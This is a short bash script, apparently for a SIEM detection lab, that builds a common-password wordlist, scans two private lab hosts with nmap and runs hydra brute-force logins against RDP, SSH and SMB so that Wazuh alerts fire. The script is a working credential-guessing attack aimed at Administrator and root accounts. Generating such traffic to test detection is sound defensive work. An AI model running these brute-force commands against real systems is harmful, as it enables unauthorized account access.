#!/bin/bash
# ====================================================================
# Script: brute-force-hydra.sh
# Purpose: Simulates RDP, SSH, and SMB brute force attacks for SIEM Lab
# WARNING: ONLY RUN IN ISOLATED LAB ENVIRONMENT. UNAUTHORIZED USE IS ILLEGAL.
# ====================================================================

echo -e "\e[31mWARNING: Only run this script in an isolated lab environment.\e[0m"
sleep 3

TARGET_WIN="192.168.56.20"
TARGET_LINUX="192.168.56.30"
WIN_USER="Administrator"
LINUX_USER="root"
WORDLIST="wordlist.txt"

# Create custom wordlist
echo -e "\e[36m[*] Creating custom wordlist...\e[0m"
cat << 'EOF' > $WORDLIST
password
123456
12345678
admin
admin123
qwerty
password123
123456789
root
toor
letmein
dragon
iloveyou
football
monkey
baseball
welcome
master
spring2024
autumn2024
ActualPassword123!
EOF

echo -e "\e[36m[*] Running Nmap pre-scan...\e[0m"
nmap -p 22,445,3389 $TARGET_WIN $TARGET_LINUX

echo -e "\e[33m[*] Starting RDP Brute Force...\e[0m"
hydra -l $WIN_USER -P $WORDLIST rdp://$TARGET_WIN -t 4 -V -I

echo -e "\e[33m[*] Starting SSH Brute Force...\e[0m"
hydra -l $LINUX_USER -P $WORDLIST ssh://$TARGET_LINUX -t 4 -V -I

echo -e "\e[33m[*] Starting SMB Brute Force...\e[0m"
hydra -l $WIN_USER -P $WORDLIST smb://$TARGET_WIN -t 4 -V -I

echo -e "\e[32m[+] Simulation complete. Check Wazuh for Rule 100100/100101 alerts.\e[0m"
rm $WORDLIST
